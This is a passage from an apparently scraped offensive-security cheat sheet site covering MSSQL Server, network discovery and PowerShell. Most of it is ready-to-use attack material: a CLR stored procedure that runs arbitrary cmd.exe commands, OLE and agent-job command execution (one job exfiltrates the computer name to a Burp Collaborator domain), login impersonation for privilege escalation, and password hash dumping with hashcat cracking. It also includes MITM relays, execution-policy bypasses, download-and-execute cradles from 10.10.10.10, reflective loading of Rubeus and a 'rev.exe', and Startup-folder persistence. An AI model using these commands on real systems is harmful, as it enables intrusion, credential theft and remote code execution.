System.Data;\nusing System.Data.SqlClient;\nusing System.Data.SqlTypes;\nusing Microsoft.SqlServer.Server;\nusing System.IO;\nusing System.Diagnostics;\nusing System.Text;\n\npublic partial class StoredProcedures\n{\n    [Microsoft.SqlServer.Server.SqlProcedure]\n    public static void cmd_exec (SqlString execCommand)\n    {\n        Process proc = new Process();\n        proc.StartInfo.FileName = @\"C:\\Windows\\System32\\cmd.exe\";\n        proc.StartInfo.Arguments = string.Format(@\" /C {0}\", execCommand.Value);\n        proc.StartInfo.UseShellExecute = false;\n        proc.StartInfo.RedirectStandardOutput = true;\n        proc.Start();\n\n        // Create the record and specify the metadata for the columns.\n        SqlDataRecord record = new SqlDataRecord(new SqlMetaData(\"output\", SqlDbType.NVarChar, 4000));\n\n        // Mark the beginning of the result set.\n        SqlContext.Pipe.SendResultsStart(record);\n\n        // Set values for each column in the row\n        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());\n\n        // Send the row back to the client.\n        SqlContext.Pipe.SendResultsRow(record);\n\n        // Mark the end of the result set.\n        SqlContext.Pipe.SendResultsEnd();\n\n        proc.WaitForExit();\n        proc.Close();\n    }\n};\n</code></pre> <p>Then follow these instructions:</p> <ol> <li>Enable <code>show advanced options</code> on the server     <pre><code>sp_configure 'show advanced options',1; \nRECONFIGURE\nGO\n</code></pre></li> <li>Enable CLR on the server     <pre><code>sp_configure 'clr enabled',1\nRECONFIGURE\nGO\n</code></pre></li> <li>Import the assembly     <pre><code>CREATE ASSEMBLY my_assembly\nFROM 'c:\\temp\\cmd_exec.dll'\nWITH PERMISSION_SET = UNSAFE;\n</code></pre></li> <li>Link the assembly to a stored procedure     <pre><code>CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];\nGO\n</code></pre></li> <li>Execute and clean     <pre><code>cmd_exec \"whoami\"\nDROP PROCEDURE cmd_exec\nDROP ASSEMBLY my_assembly\n</code></pre></li> </ol> <p>CREATE ASSEMBLY will also accept an hexadecimal string representation of a CLR DLL</p> <pre><code>CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM \n0x4D5A90000300000004000000F[TRUNCATED]\nWITH PERMISSION_SET = UNSAFE \nGO \n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#ole-automation","title":"OLE Automation","text":"<ul> <li> Disabled by default</li> <li>The execution takes place with privileges of the service account.</li> </ul>"},{"location":"cheatsheets/mssql-server-cheatsheet/#execute-commands-using-ole-automation-procedures","title":"Execute commands using OLE automation procedures","text":"<pre><code>Invoke-SQLOSCmdOle -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command \"whoami\" Verbose\n</code></pre> <pre><code># Enable OLE Automation\nEXEC sp_configure 'show advanced options', 1\nEXEC sp_configure reconfigure\nEXEC sp_configure 'OLE Automation Procedures', 1\nEXEC sp_configure reconfigure\n\n# Execute commands\nDECLARE @execmd INT\nEXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT\nEXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\\system32\\cmd.exe /c'\n</code></pre> <pre><code># https://github.com/blackarrowsec/mssqlproxy/blob/master/mssqlclient.py\npython3 mssqlclient.py 'host/username:password@10.10.10.10' -install -clr Microsoft.SqlServer.Proxy.dll\npython3 mssqlclient.py 'host/username:password@10.10.10.10' -check -reciclador 'C:\\windows\\temp\\reciclador.dll'\npython3 mssqlclient.py 'host/username:password@10.10.10.10' -start -reciclador 'C:\\windows\\temp\\reciclador.dll'\nSQL&gt; enable_ole\nSQL&gt; upload reciclador.dll C:\\windows\\temp\\reciclador.dll\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#agent-jobs","title":"Agent Jobs","text":"<ul> <li>The execution takes place with privileges of the SQL Server Agent service account if a proxy account is not configured.</li> <li> Require sysadmin or SQLAgentUserRole, SQLAgentReaderRole, and SQLAgentOperatorRole roles to create a job.</li> </ul>"},{"location":"cheatsheets/mssql-server-cheatsheet/#execute-commands-through-sql-agent-job-service","title":"Execute commands through SQL Agent Job service","text":"<pre><code>Invoke-SQLOSCmdAgentJob -Subsystem PowerShell -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command \"powershell e &lt;base64encodedscript&gt;\" -Verbose\nSubsystem Options:\n\u2013Subsystem CmdExec\n-SubSystem PowerShell\n\u2013Subsystem VBScript\n\u2013Subsystem Jscript\n</code></pre> <pre><code>USE msdb; \nEXEC dbo.sp_add_job @job_name = N'test_powershell_job1'; \nEXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'$name=$env:COMPUTERNAME[10];nslookup \"$name.redacted.burpcollaborator.net\"', @retry_attempts = 1, @retry_interval = 5 ;\nEXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; \nEXEC dbo.sp_start_job N'test_powershell_job1';\n\n-- delete\nEXEC dbo.sp_delete_job @job_name = N'test_powershell_job1';\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#list-all-jobs","title":"List All Jobs","text":"<pre><code>SELECT job_id, [name] FROM msdb.dbo.sysjobs;\nSELECT job.job_id, notify_level_email, name, enabled, description, step_name, command, server, database_name FROM msdb.dbo.sysjobs job INNER JOIN msdb.dbo.sysjobsteps steps ON job.job_id = steps.job_id\nGet-SQLAgentJob -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -username sa -Password Password1234 -Verbose\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#external-scripts","title":"External Scripts","text":"<p> You need to enable external scripts.</p> <pre><code>sp_configure 'external scripts enabled', 1;\nRECONFIGURE;\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#python","title":"Python:","text":"<pre><code>Invoke-SQLOSCmdPython -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command \"powershell -e &lt;base64encodedscript&gt;\" -Verbose\n\nEXEC sp_execute_external_script @language =N'Python',@script=N'import subprocess p = subprocess.Popen(\"cmd.exe /c whoami\", stdout=subprocess.PIPE) OutputDataSet = pandas.DataFrame([str(p.stdout.read(), \"utf-8\")])'\nWITH RESULT SETS (([cmd_out] nvarchar(max)))\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#r","title":"R","text":"<pre><code>Invoke-SQLOSCmdR -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command \"powershell -e &lt;base64encodedscript&gt;\" -Verbose\n\nEXEC sp_execute_external_script @language=N'R',@script=N'OutputDataSet &lt;- data.frame(system(\"cmd.exe /c dir\",intern=T))'\nWITH RESULT SETS (([cmd_out] text));\nGO\n\n@script=N'OutputDataSet &lt;-data.frame(shell(\"dir\",intern=T))'\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#audit-checks","title":"Audit Checks","text":""},{"location":"cheatsheets/mssql-server-cheatsheet/#find-and-exploit-impersonation-opportunities","title":"Find and exploit impersonation opportunities","text":"<ul> <li>Impersonate as: <code>EXECUTE AS LOGIN = 'sa'</code></li> <li>Impersonate <code>dbo</code> with DB_OWNER     <pre><code>SQL&gt; select is_member('db_owner');\nSQL&gt; execute as user = 'dbo'\nSQL&gt; SELECT is_srvrolemember('sysadmin')\n</code></pre></li> </ul> <pre><code>Invoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Exploit -Verbose\n\n# impersonate sa account\npowerpick Get-SQLQuery -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query \"EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER(''sysadmin'')\" -Verbose -Debug\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#find-databases-that-have-been-configured-as-trustworthy","title":"Find databases that have been configured as trustworthy","text":"<pre><code>Invoke-SQLAuditPrivTrustworthy -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Exploit -Verbose \n\nSELECT name as database_name, SUSER_NAME(owner_sid) AS database_owner, is_trustworthy_on AS TRUSTWORTHY from sys.databases\n</code></pre> <p>The following audit checks run web requests to load Inveigh via reflection. Be mindful of the environment and ability to connect outbound.</p> <pre><code>Invoke-SQLAuditPrivXpDirtree\nInvoke-SQLUncPathInjection\nInvoke-SQLAuditPrivXpFileexist\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#manual-sql-server-queries","title":"Manual SQL Server Queries","text":""},{"location":"cheatsheets/mssql-server-cheatsheet/#query-current-user-determine-if-the-user-is-a-sysadmin","title":"Query Current User &amp; determine if the user is a sysadmin","text":"<pre><code>select suser_sname()\nSelect system_user\nselect is_srvrolemember('sysadmin')\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#current-role","title":"Current Role","text":"<pre><code>Select user\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#current-db","title":"Current DB","text":"<pre><code>select db_name()\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#list-all-tables","title":"List all tables","text":"<pre><code>select table_name from information_schema.tables\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#list-all-databases","title":"List all databases","text":"<pre><code>select name from master..sysdatabases\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#all-logins-on-server","title":"All Logins on Server","text":"<pre><code>Select * from sys.server_principals where type_desc != 'SERVER_ROLE'\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#all-database-users-for-a-database","title":"All Database Users for a Database","text":"<pre><code>Select * from sys.database_principals where type_desc != 'database_role';\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#list-all-sysadmins","title":"List All Sysadmins","text":"<pre><code>SELECT name,type_desc,is_disabled FROM sys.server_principals WHERE IS_SRVROLEMEMBER ('sysadmin',name) = 1\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#list-all-database-roles","title":"List All Database Roles","text":"<pre><code>SELECT DB1.name AS DatabaseRoleName,\nisnull (DB2.name, 'No members') AS DatabaseUserName\nFROM sys.database_role_members AS DRM\nRIGHT OUTER JOIN sys.database_principals AS DB1\nON DRM.role_principal_id = DB1.principal_id\nLEFT OUTER JOIN sys.database_principals AS DB2\nON DRM.member_principal_id = DB2.principal_id\nWHERE DB1.type = 'R'\nORDER BY DB1.name;\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#effective-permissions-from-the-server","title":"Effective Permissions from the Server","text":"<pre><code>select * from fn_my_permissions(null, 'server');\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#effective-permissions-from-the-database","title":"Effective Permissions from the Database","text":"<pre><code>SELECT * FROM fn_dp1my_permissions(NULL, 'DATABASE');\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#find-sql-server-logins-which-can-be-impersonated-for-the-current-database","title":"Find SQL Server Logins Which can be Impersonated for the Current Database","text":"<pre><code>select distinct b.name\nfrom sys.server_permissions a\ninner join sys.server_principals b\non a.grantor_principal_id = b.principal_id\nwhere a.permission_name = 'impersonate'\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#exploiting-impersonation","title":"Exploiting Impersonation","text":"<pre><code>SELECT SYSTEM_USER\nSELECT IS_SRVROLEMEMBER('sysadmin')\nEXECUTE AS LOGIN = 'adminuser'\nSELECT SYSTEM_USER\nSELECT IS_SRVROLEMEMBER('sysadmin')\nSELECT ORIGINAL_LOGIN()\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#exploiting-nested-impersonation","title":"Exploiting Nested Impersonation","text":"<pre><code>SELECT SYSTEM_USER\nSELECT IS_SRVROLEMEMBER('sysadmin')\nEXECUTE AS LOGIN = 'stduser'\nSELECT SYSTEM_USER\nEXECUTE AS LOGIN = 'sa'\nSELECT IS_SRVROLEMEMBER('sysadmin')\nSELECT ORIGINAL_LOGIN()\nSELECT SYSTEM_USER\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#mssql-accounts-and-hashes","title":"MSSQL Accounts and Hashes","text":"<pre><code>MSSQL 2000:\nSELECT name, password FROM master..sysxlogins\nSELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.)\n\nMSSQL 2005\nSELECT name, password_hash FROM master.sys.sql_logins\nSELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins\n</code></pre> <p>Then crack passwords using Hashcat : <code>hashcat -m 1731 -a 0 mssql_hashes_hashcat.txt /usr/share/wordlists/rockyou.txt --force</code></p> <pre><code>131 MSSQL (2000)    0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578\n132 MSSQL (2005)    0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe\n1731    MSSQL (2012, 2014)  0x02000102030434ea1b17802fd95ea6316bd61d2c94622ca3812793e8fb1672487b5c904a45a31b2ab4a78890d563d2fcf5663e46fe797d71550494be50cf4915d3f4d55ec375\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#references","title":"References","text":"<ul> <li>PowerUpSQL Cheat Sheet &amp; SQL Server Queries - Leo Pitt</li> <li>PowerUpSQL Cheat Sheet - Scott Sutherland</li> <li>Attacking SQL Server CLR Assemblies - Scott Sutherland - July 13th, 2017</li> <li>MSSQL Agent Jobs for Command Execution - Nicholas Popovich - September 21, 2016</li> </ul>"},{"location":"cheatsheets/network-discovery/","title":"Network Discovery","text":""},{"location":"cheatsheets/network-discovery/#summary","title":"Summary","text":"<ul> <li>Nmap</li> <li>Network Scan with nc and ping</li> <li>Spyse</li> <li>Masscan</li> <li>Netdiscover</li> <li>Responder</li> <li>Bettercap</li> <li>Reconnoitre</li> <li>SSL MITM with OpenSSL</li> <li>References</li> </ul>"},{"location":"cheatsheets/network-discovery/#nmap","title":"Nmap","text":"<ul> <li>Ping sweep (No port scan, No DNS resolution)</li> </ul> <pre><code>nmap -sn -n --disable-arp-ping 192.168.1.1-254 | grep -v \"host down\"\n-sn : Disable port scanning. Host discovery only.\n-n : Never do DNS resolution\n</code></pre> <ul> <li>Basic NMAP</li> </ul> <pre><code>sudo nmap -sSV -p- 192.168.0.1 -oA OUTPUTFILE -T4\nsudo nmap -sSV -oA OUTPUTFILE -T4 -iL INPUTFILE.csv\n\n\u2022 the flag -sSV defines the type of packet to send to the server and tells Nmap to try and determine any service on open ports\n\u2022 the -p- tells Nmap to check all 65,535 ports (by default it will only check the most popular 1,000)\n\u2022 192.168.0.1 is the IP address to scan\n\u2022 -oA OUTPUTFILE tells Nmap to output the findings in its three major formats at once using the filename \"OUTPUTFILE\"\n\u2022 -iL INPUTFILE tells Nmap to use the provided file as inputs\n</code></pre> <ul> <li>CTF NMAP</li> </ul> <p>This configuration is enough to do a basic check for a CTF VM</p> <pre><code>nmap -sV -sC -oA ~/nmap-initial 192.168.1.1\n\n-sV : Probe open ports to determine service/version info\n-sC : to enable the script\n-oA : to save the results\n\nAfter this quick command you can add \"-p-\" to run a full scan while you work with the previous result\n</code></pre> <ul> <li>Aggressive NMAP</li> </ul> <pre><code>nmap -A -T4 scanme.nmap.org\n\u2022 -A: Enable OS detection, version detection, script scanning, and traceroute\n\u2022 -T4: Defines the timing for the task (options are 0-5 and higher is faster)\n</code></pre> <ul> <li>Using searchsploit to detect vulnerable services</li> </ul> <pre><code>nmap -p- -sV -oX a.xml IP_ADDRESS; searchsploit --nmap a.xml\n</code></pre> <ul> <li>Generating nice scan report</li> </ul> <pre><code>nmap -sV IP_ADDRESS -oX scan.xml &amp;&amp; xsltproc scan.xml -o \"`date +%m%d%y`_report.html\"\n</code></pre> <ul> <li>NMAP Scripts</li> </ul> <pre><code>nmap -sC : equivalent to --script=default\n\nnmap --script 'http-enum' -v web.xxxx.com -p80 -oN http-enum.nmap\nPORT   STATE SERVICE\n80/tcp open  http\n| http-enum:\n|   /phpmyadmin/: phpMyAdmin\n|   /.git/HEAD: Git folder\n|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'\n|_  /image/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'\n\nnmap --script smb-enum-users.nse -p 445 [target host]\nHost script results:\n| smb-enum-users:\n|   METASPLOITABLE\\backup (RID: 1068)\n|     Full name:   backup\n|     Flags:       Account disabled, Normal user account\n|   METASPLOITABLE\\bin (RID: 1004)\n|     Full name:   bin\n|     Flags:       Account disabled, Normal user account\n|   METASPLOITABLE\\msfadmin (RID: 3000)\n|     Full name:   msfadmin,,,\n|     Flags:       Normal user account\n\nList Nmap scripts : ls /usr/share/nmap/scripts/\n</code></pre>"},{"location":"cheatsheets/network-discovery/#network-scan-with-nc-and-ping","title":"Network Scan with nc and ping","text":"<p>Sometimes we want to perform network scan without any tools like nmap. So we can use the commands <code>ping</code> and <code>nc</code> to check if a host is up and which port is open. To check if hosts are up on a /24 range <pre><code>for i in `seq 1 255`; do ping -c 1 -w 1 192.168.1.$i &gt; /dev/null 2&gt;&amp;1; if [ $? -eq 0 ]; then echo \"192.168.1.$i is UP\"; fi ; done\n</code></pre> To check which ports are open on a specific host <pre><code>for i in {21,22,80,139,443,445,3306,3389,8080,8443}; do nc -z -w 1 192.168.1.18 $i &gt; /dev/null 2&gt;&amp;1; if [ $? -eq 0 ]; then echo \"192.168.1.18 has port $i open\"; fi ; done\n</code></pre> Both at the same time on a /24 range <pre><code>for i in `seq 1 255`; do ping -c 1 -w 1 192.168.1.$i &gt; /dev/null 2&gt;&amp;1; if [ $? -eq 0 ]; then echo \"192.168.1.$i is UP:\"; for j in {21,22,80,139,443,445,3306,3389,8080,8443}; do nc -z -w 1 192.168.1.$i $j &gt; /dev/null 2&gt;&amp;1; if [ $? -eq 0 ]; then echo \"\\t192.168.1.$i has port $j open\"; fi ; done ; fi ; done\n</code></pre> Not in one-liner version: <pre><code>for i in `seq 1 255`; \ndo \n    ping -c 1 -w 1 192.168.1.$i &gt; /dev/null 2&gt;&amp;1; \n    if [ $? -eq 0 ]; \n    then \n        echo \"192.168.1.$i is UP:\"; \n        for j in {21,22,80,139,443,445,3306,3389,8080,8443}; \n        do \n            nc -z -w 1 192.168.1.$i $j &gt; /dev/null 2&gt;&amp;1; \n            if [ $? -eq 0 ]; \n            then \n                echo \"\\t192.168.1.$i has port $j open\"; \n            fi ; \n        done ; \n    fi ; \ndone\n</code></pre></p>"},{"location":"cheatsheets/network-discovery/#spyse","title":"Spyse","text":"<ul> <li> <p>Spyse API - for detailed info is better to check Spyse</p> </li> <li> <p>Spyse Wrapper</p> </li> </ul>"},{"location":"cheatsheets/network-discovery/#searching-for-subdomains","title":"Searching for subdomains","text":"<pre><code>spyse -target xbox.com --subdomains\n</code></pre>"},{"location":"cheatsheets/network-discovery/#reverse-ip-lookup","title":"Reverse IP Lookup","text":"<pre><code>spyse -target 52.14.144.171 --domains-on-ip\n</code></pre>"},{"location":"cheatsheets/network-discovery/#searching-for-ssl-certificates","title":"Searching for SSL certificates","text":"<p><pre><code>spyse -target hotmail.com --ssl-certificates\n</code></pre> <pre><code>spyse -target \"org: Microsoft\" --ssl-certificates\n</code></pre></p>"},{"location":"cheatsheets/network-discovery/#getting-all-dns-records","title":"Getting all DNS records","text":"<pre><code>spyse -target xbox.com --dns-all\n</code></pre>"},{"location":"cheatsheets/network-discovery/#masscan","title":"Masscan","text":"<pre><code>masscan -iL ips-online.txt --rate 10000 -p1-65535 --only-open -oL masscan.out\nmasscan -e tun0 -p1-65535,U:1-65535 10.10.10.97 --rate 1000\n\n# find machines on the network\nsudo masscan --rate 500 --interface tap0 --router-ip $ROUTER_IP --top-ports 100 $NETWORK -oL masscan_machines.tmp\ncat masscan_machines.tmp | grep open | cut -d \" \" -f4 | sort -u &gt; masscan_machines.lst\n\n# find open ports for one machine\nsudo masscan --rate 1000 --interface tap0 --router-ip $ROUTER_IP -p1-65535,U:1-65535 $MACHINE_IP --banners -oL $MACHINE_IP/scans/masscan-ports.lst\n\n\n# TCP grab banners and services information\nTCP_PORTS=$(cat $MACHINE_IP/scans/masscan-ports.lst| grep open | grep tcp | cut -d \" \" -f3 | tr '\\n' ',' | head -c -1)\n[ \"$TCP_PORTS\" ] &amp;&amp; sudo nmap -sT -sC -sV -v -Pn -n -T4 -p$TCP_PORTS --reason --version-intensity=5 -oA $MACHINE_IP/scans/nmap_tcp $MACHINE_IP\n\n# UDP grab banners and services information\nUDP_PORTS=$(cat $MACHINE_IP/scans/masscan-ports.lst| grep open | grep udp | cut -d \" \" -f3 | tr '\\n' ',' | head -c -1)\n[ \"$UDP_PORTS\" ] &amp;&amp; sudo nmap -sU -sC -sV -v -Pn -n -T4 -p$UDP_PORTS --reason --version-intensity=5 -oA $MACHINE_IP/scans/nmap_udp $MACHINE_IP\n</code></pre>"},{"location":"cheatsheets/network-discovery/#reconnoitre","title":"Reconnoitre","text":"<p>Dependencies:</p> <ul> <li>nbtscan</li> <li>nmap</li> </ul> <pre><code>python2.7 ./reconnoitre.py -t 192.168.1.2-252 -o ./results/ --pingsweep --hostnames --services --quick\n</code></pre> <p>If you have a segfault with nbtscan, read the following quote.</p> <p>Permission is denied on the broadcast address (.0) and it segfaults on the gateway (.1) - all other addresses seem fine here.So to mitigate the problem: nbtscan 192.168.0.2-255</p>"},{"location":"cheatsheets/network-discovery/#netdiscover","title":"Netdiscover","text":"<pre><code>netdiscover -i eth0 -r 192.168.1.0/24\nCurrently scanning: Finished!   |   Screen View: Unique Hosts\n\n20 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 876\n_____________________________________________________________________________\nIP            At MAC Address     Count     Len  MAC Vendor / Hostname\n-----------------------------------------------------------------------------\n192.168.1.AA    68:AA:AA:AA:AA:AA     15     630  Sagemcom\n192.168.1.XX    52:XX:XX:XX:XX:XX      1      60  Unknown vendor\n192.168.1.YY    24:YY:YY:YY:YY:YY      1      60  QNAP Systems, Inc.\n192.168.1.ZZ    b8:ZZ:ZZ:ZZ:ZZ:ZZ      3     126  HUAWEI TECHNOLOGIES CO.,LTD  \n</code></pre>"},{"location":"cheatsheets/network-discovery/#responder","title":"Responder","text":"<pre><code>responder -I eth0 -A # see NBT-NS, BROWSER, LLMNR requests without responding.\nresponder.py -I eth0 -wrf\n</code></pre> <p>Alternatively you can use the Windows version</p>"},{"location":"cheatsheets/network-discovery/#bettercap","title":"Bettercap","text":"<pre><code>bettercap -X --proxy --proxy-https -T &lt;target IP&gt;\n# better cap in spoofing, discovery, sniffer\n# intercepting http and https requests,\n# targetting specific IP only\n</code></pre>"},{"location":"cheatsheets/network-discovery/#ssl-mitm-with-openssl","title":"SSL MITM with OpenSSL","text":"<p>This code snippet allows you to sniff/modify SSL traffic if there is a MITM vulnerability using only openssl. If you can modify <code>/etc/hosts</code> of the client: <pre><code>sudo echo \"[OPENSSL SERVER ADDRESS] [domain.of.server.to.mitm]\" &gt;&gt; /etc/hosts  # On client host\n</code></pre> On our MITM server, if the client accepts self signed certificates (you can use a legit certificate if you have the private key of the legit server): <pre><code>openssl req -subj '/CN=[domain.of.server.to.mitm]' -batch -new -x509 -days 365 -nodes -out server.pem -keyout server.pem\n</code></pre> On our MITM server, we setup our infra: <pre><code>mkfifo response\nsudo openssl s_server -cert server.pem -accept [INTERFACE TO LISTEN TO]:[PORT] -quiet &lt; response | tee | openssl s_client -quiet -servername [domain.of.server.to.mitm] -connect[IP of server to MITM]:[PORT] | tee | cat &gt; response\n</code></pre> In this example, traffic is only displayed with <code>tee</code> but we could modify it using <code>sed</code> for example.</p>"},{"location":"cheatsheets/network-discovery/#references","title":"References","text":"<ul> <li>TODO</li> </ul>"},{"location":"cheatsheets/powershell-cheatsheet/","title":"Powershell","text":""},{"location":"cheatsheets/powershell-cheatsheet/#summary","title":"Summary","text":"<ul> <li>Powershell</li> <li>Summary</li> <li>Execution Policy</li> <li>Encoded Commands</li> <li>Constrained Mode</li> <li>Encoded Commands</li> <li>Download file</li> <li>Load Powershell scripts</li> <li>Load C# assembly reflectively</li> <li>Call Win API using delegate functions with Reflection<ul> <li>Resolve address functions</li> <li>DelegateType Reflection</li> <li>Example with a simple shellcode runner</li> </ul> </li> <li>Secure String to Plaintext</li> <li>References</li> </ul>"},{"location":"cheatsheets/powershell-cheatsheet/#execution-policy","title":"Execution Policy","text":"<pre><code>powershell -EncodedCommand $encodedCommand\npowershell -ep bypass ./PowerView.ps1\n\n# Change execution policy\nSet-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted\nSet-ExecutionPolicy Bypass -Scope Process\n</code></pre>"},{"location":"cheatsheets/powershell-cheatsheet/#constrained-mode","title":"Constrained Mode","text":"<pre><code># Check if we are in a constrained mode\n# Values could be: FullLanguage or ConstrainedLanguage\n$ExecutionContext.SessionState.LanguageMode\n\n## Bypass\npowershell -version 2\n</code></pre>"},{"location":"cheatsheets/powershell-cheatsheet/#encoded-commands","title":"Encoded Commands","text":"<ul> <li>Windows     <pre><code>$command = 'IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.10.10/PowerView.ps1\")'\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)\n$encodedCommand = [Convert]::ToBase64String($bytes)\n</code></pre></li> <li>Linux:  UTF-16LE encoding is required     <pre><code>echo 'IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.10.10/PowerView.ps1\")' | iconv -t utf-16le | base64 -w 0\n</code></pre></li> </ul>"},{"location":"cheatsheets/powershell-cheatsheet/#download-file","title":"Download file","text":"<pre><code># Any version\n(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/PowerView.ps1\", \"C:\\Windows\\Temp\\PowerView.ps1\")\nwget \"http://10.10.10.10/taskkill.exe\" -OutFile \"C:\\ProgramData\\unifivideo\\taskkill.exe\"\nImport-Module BitsTransfer; Start-BitsTransfer -Source $url -Destination $output\n\n# Powershell 4+\nIWR \"http://10.10.10.10/binary.exe\" -OutFile \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\binary.exe\"\nInvoke-WebRequest \"http://10.10.10.10/binary.exe\" -OutFile \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\binary.exe\"\n</code></pre>"},{"location":"cheatsheets/powershell-cheatsheet/#load-powershell-scripts","title":"Load Powershell scripts","text":"<pre><code># Proxy-aware\nIEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1')\necho IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1') | powershell -noprofile -\npowershell -exec bypass -c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.10.10/PowerView.ps1')|iex\"\n\n# Non-proxy aware\n$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.10.10/PowerView.ps1',$false);$h.send();iex $h.responseText\n</code></pre>"},{"location":"cheatsheets/powershell-cheatsheet/#load-c-assembly-reflectively","title":"Load C# assembly reflectively","text":"<pre><code># Download and run assembly without arguments\n$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')\n$assem = [System.Reflection.Assembly]::Load($data)\n[rev.Program]::Main()\n\n# Download and run Rubeus, with arguments (make sure to split the args)\n$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')\n$assem = [System.Reflection.Assembly]::Load($data)\n[Rubeus.Program]::Main(\"s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt\".Split())\n\n# Execute a specific method from an assembly (e.g. a DLL)\n$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')\n$assem = [System.Reflection.Assembly]::Load($data)\n$class = $assem.GetType(\"ClassLibrary1.Class1\")\n$method = $class.GetMethod(\"runner\")\n$method.Invoke(0, $null)\n</code></pre>"},{"location":"cheatsheets/powershell-cheatsheet/#call-win-api-using-delegate-functions-with-reflection","title":"Call Win API using delegate functions with Reflection","text":""},{"location":"cheatsheets/powershell-cheatsheet/#resolve-address-functions","title":"Resolve address functions","text":"<p>To perform reflection we first need to obtain <code>GetModuleHandle</code> and <code>GetProcAdresse</code> to be able to lookup of Win32 API function addresses.</p> <p>To retrieve those function we will need to find out if there are included inside the existing loaded Assemblies. <pre><code># Retrieve all loaded Assemblies\n$Assemblies = [AppDomain]::CurrentDomain.GetAssemblies()\n\nIterate over all the Assemblies, to retrieve all the Static and Unsafe Methods \n$Assemblies |\n  ForEach-Object {\n    $_.GetTypes()|\n      ForEach-Object {\n          $_ | Get-Member -Static| Where-Object {\n            $_.TypeName.Contains('Unsafe')\n          }\n      } 2&gt; $nul l\n</code></pre> We want to find where the Assemblies are located, so we will use the statement <code>Location</code>. Then we will look for all the methods inside the Assembly <code>Microsoft.Win32.UnsafeNativeMethods</code>  TBN: <code>GetModuleHandle</code> and <code>GetProcAddress</code> are located in <code>C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System\\v4.0_4.0.0.0__b77a5c561934e089\\System.dll</code> </p> <p>If we want to use those function we need in a first time get a reference to the .dll file we need the object to have the property <code>GlobalAssemblyCache</code> set (The Global Assembly Cache is essentially a list of all native and registered assemblies on Windows, which will allow us to filter out non-native assemblies). The second filter is to retrieve the <code>System.dll</code>. <pre><code>$systemdll = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { \n  $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') 